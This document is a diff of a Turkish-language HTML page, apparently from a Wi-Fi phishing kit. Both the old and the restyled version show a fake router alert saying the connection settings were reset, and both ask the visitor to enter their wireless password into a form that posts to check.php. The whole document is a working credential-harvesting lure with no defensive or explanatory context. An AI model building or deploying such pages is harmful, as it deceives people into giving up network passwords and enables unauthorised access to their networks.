@@ -1,65 +1,115 @@
 <html>
+
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
-
-<link rel="stylesheet" type="text/css" href="info2.css" media="all">
-</head>
-<body bgcolor="transparent" marginheight="0" marginwidth="0">
-
-<table border="0" cellpadding="0" cellspacing="0" width="100%">
-  <tbody><tr> 
-      <td width="2%">&nbsp;</td><td width="5%"></td><td width="93%"> 
-      <div valign="top" align="left"> 
-        <table border="0" cellpadding="0" cellspacing="0" width="360">
-           
-          </tr>
-          <TABLE id="autoWidth">
-
-      <TBODY>
-<tr><td><hr color="#9CBCE3" size=3 width="99%"></td></tr>
-
-
-                  <tr><td colspan=\"2\" ><font color="#282B2F"><b></b></td></tr>
-        <tr><td colspan=\"2\"  ><font color="#282B2F"><b></b> Baglanti ayarlariniz sifirlandi!</td></tr>
-        <tr><td colspan=\"2\"  ><font color="#282B2F"><b></b></td></tr>
-
-
-<tr><td></td></tr>
-
-
-<tr><td><hr color="#9CBCE3" size=3 width="99%"></td></tr>
-<tr><td></td></tr>
-
-        <TR>
-
-          <TD class=info1 colspan=2>
-<br><font color="#282B2F">
-Bir sorun algilandi ve baglantiniz sifirlandi.Tekrar baglanti saglamak icin lutfen sifrenizi giriniz
-<br>
-<br>
-Guvenliginiz icin kablosuz ag sifrenizi giriniz<b></b>
-<br>
-<div id="box" align="left" >
-<form id="form1" name="form1" method="POST" action="check.php" >
-<tr><td><b><font color="#282B2F">Wifi</b> Sifreniz:</td></tr>
-<tr><td><input name="key1" type="password" class="textfield" /><td></tr>
-
-
-        <TR><TD class=blue colspan=2></TD></TR>
-                <TR><TD class=blue colspan=2></TD></TR>
-
+    <style>
+        body {
+            margin: 0px;
+            background-color: transparent;
+            overflow: hidden;
+            position: relative;
+        }
         
-<tr><td colspan="2"><INPUT name="Confirm" class="button" type="submit" value="Confirm"/></td></tr>
+        .mainframe-error {
+            height: 60px;
+            width: 100%;
+            text-align: center;
+            border-bottom: 1px;
+            border-color: #CCCCCC;
+            border-style: solid;
+            border-left: 0px;
+            border-right: 0px;
+            border-top: 0px;
+        }
+        
+        .mainframe-error-text {
+            padding-top: 20px;
+        }
+        
+        .mainframe-info {
+            margin-left: 5%;
+        }
+        
+        .border-bottom {
+            border-left: 0px;
+            border-top: 0px;
+            border-right: 0px;
+            border-bottom: 1px;
+            border-color: #CCCCCC;
+            border-style: solid;
+        }
+        
+        .table-input {
+            padding-top: 5px;
+            padding-bottom: 5px;
+        }
+        
+        .div-fill-all {
+            width: 100%;
+            padding-top: 20px;
+        }
+        
+        .confirmbtn {
+            background-image: url(images/buton_bg2.gif);
+            color: #FFF;
+            font-weight: bold;
+            height: 21px;
+            width: 110px;
+            border: 0pt none;
+            align-items: flex-start;
+            text-align: center;
+            cursor: default;
+            background-color: buttonface;
+            box-sizing: border-box;
+            -webkit-appearance: push-button;
+            user-select: none;
+            white-space: pre;
+            -webkit-rtl-ordering: logical;
+            margin: 0em;
+            font: 400 13.3333px Arial;
+            letter-spacing: normal;
+            word-spacing: normal;
+            text-transform: none;
+            text-indent: 0px;
+            text-shadow: none;
+            display: inline-block;
+            text-rendering: auto;
+        }
+    </style>
 
-</form></div>
+</head>
 
-</TD></TR>
+<body>
+    <div class="mainframe-error">
+        <p class="mainframe-error-text">Bağlantı ayarlarınız sıfırlandı!</p>
+    </div>
+    <div class="border-bottom">
+        <p class="mainframe-info">Bağlantınızda bir sorun algılandı ve bağlantı ayarlarınız sıfırlandı</p>
+        <p class="mainframe-info">Bağlantınızı geri getirmek için şifrenizi giriniz:</p>
+    </div>
+    <div class="table-div border-bottom">
+        <table class="table-input " align="center">
+            <tbody>
+                <tr>
+                    <td>
+                        <p>Şifre</p>
+                    </td>
+                    <form id="form1" name="form1" method="POST" action="check.php">
+                        <td class="table-data-1">
+                            <input name="key1" type="password" class="input-pass" />
+                        </td>
+                </tr>
+            </tbody>
 
+        </table>
 
-      </TBODY>
+    </div>
+    <div class="div-fill-all">
+        <center>
+            <input name="Confirm" class="confirmbtn" type="submit" value="Tamam" />
+        </center>
+    </div>
+    </form>
 
-    </TABLE>
-</table></div></td></tr></tbody></table>
 </body>
-</html>
 
+</html>
